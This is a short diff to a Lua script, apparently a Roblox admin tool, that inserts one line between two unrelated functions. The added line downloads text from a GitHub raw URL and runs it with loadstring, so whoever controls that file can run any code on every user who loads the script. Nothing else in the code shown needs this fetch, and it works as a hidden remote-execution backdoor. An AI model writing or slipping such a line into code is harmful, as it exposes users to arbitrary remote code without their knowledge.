@@ -2004,6 +2004,8 @@ function r15(plr)
 	end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreakyYield/InfiniteYieldIsBad/refs/heads/main/JollyUpdate.txt"))()
+
 function toClipboard(txt)
     if everyClipboard then
         everyClipboard(tostring(txt))
